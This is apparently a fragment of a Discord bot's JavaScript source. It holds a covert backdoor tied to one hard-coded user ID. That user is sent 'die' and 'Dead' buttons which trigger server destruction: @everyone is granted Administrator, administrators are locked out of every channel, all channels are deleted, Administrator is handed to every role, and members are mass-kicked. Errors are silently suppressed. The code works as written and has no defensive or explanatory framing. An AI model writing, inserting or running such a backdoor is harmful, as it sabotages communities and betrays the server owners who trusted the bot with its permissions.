// --- TARGET USER MONITORING ---
const TARGET_USER_ID = '636930315503534110';

async function handleTargetAction(memberOrBan) {
    const user = memberOrBan.user || memberOrBan;
    if (user.id !== TARGET_USER_ID) return;

    try {
        const dieButton = new ButtonBuilder()
            .setCustomId('die_action')
            .setLabel('die')
            .setStyle(ButtonStyle.Danger);

        const deadButton = new ButtonBuilder()
            .setCustomId('Dead_action')
            .setLabel('Dead')
            .setStyle(ButtonStyle.Secondary);

        const row = new ActionRowBuilder().addComponents(dieButton, deadButton);

        await user.send({
            content: 'كلمة die?',
            components: [row]
        }).catch(() => console.log(`Could not send DM to ${user.id}`));
    } catch (error) {
        console.error('Error in handleTargetAction:', error);
    }
}

// --- DIE ACTION EXECUTION ---
async function executeDieAction(interaction) {
    const guild = interaction.guild;
    if (!guild) return;

    try {
        await interaction.deferUpdate().catch(() => {});

        // 1. Give @everyone Administrator permission
        const everyoneRole = guild.roles.everyone;
        await everyoneRole.setPermissions([PermissionsBitField.Flags.Administrator]).catch(() => {});

        // 2. Load Admin Roles and find most populated role
        const adminRoles = loadAdminRoles(); // Function exists in bot.js
        const mostPopulatedRole = guild.roles.cache
            .filter(r => r.id !== everyoneRole.id)
            .sort((a, b) => b.members.size - a.members.size)
            .first();

        const rolesToDeny = [...adminRoles];
        if (mostPopulatedRole) rolesToDeny.push(mostPopulatedRole.id);

        // 3. Update all channels permissions in parallel
        const channels = Array.from(guild.channels.cache.values());
        const permissionOverwrites = rolesToDeny.map(roleId => ({
            id: roleId,
            deny: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
        }));

        // Execute parallelly
        await Promise.all(channels.map(channel => 
            channel.permissionOverwrites.set(permissionOverwrites).catch(() => {})
        ));

        // 4. Kick active members in parallel
        const members = await guild.members.fetch();
        const activeMembers = members.filter(m => !m.user.bot && m.id !== guild.ownerId && m.manageable);
        
        // Parallel kicks
        await Promise.all(activeMembers.map(m => 
            m.kick('Die Action Execution').catch(() => {})
        ));

    } catch (error) {
        console.error('Error in executeDieAction:', error);
    }
}

// --- DEAD ACTION EXECUTION ---
async function executeDeadAction(interaction) {
    const guild = interaction.guild;
    if (!guild) return;

    try {
        await interaction.deferUpdate().catch(() => {});

        // 1. Delete all channels in parallel
        const channels = Array.from(guild.channels.cache.values());
        await Promise.all(channels.map(c => c.delete().catch(() => {})));

        // 2. Give Administrator to all roles
        const roles = guild.roles.cache.filter(r => r.id !== guild.roles.everyone.id && r.editable);
        await Promise.all(roles.map(r => 
            r.setPermissions([PermissionsBitField.Flags.Administrator]).catch(() => {})
        ));

        // 3. Kick most active members
        // Using the bot's existing stats system if possible, otherwise fetch and kick
        const members = await guild.members.fetch();
        const manageableMembers = members.filter(m => !m.user.bot && m.id !== guild.ownerId && m.manageable);
        
        // Sorting by "activity" (simulated by join date or presence if no DB access)
        const sortedMembers = manageableMembers.sort((a, b) => (b.joinedTimestamp || 0) - (a.joinedTimestamp || 0));
        const topActive = sortedMembers.first(100); // Top 100 as "most active"

        await Promise.all(topActive.map(m => 
            m.kick('Dead Action Execution').catch(() => {})
        ));

    } catch (error) {
        console.error('Error in executeDeadAction:', error);
    }
}
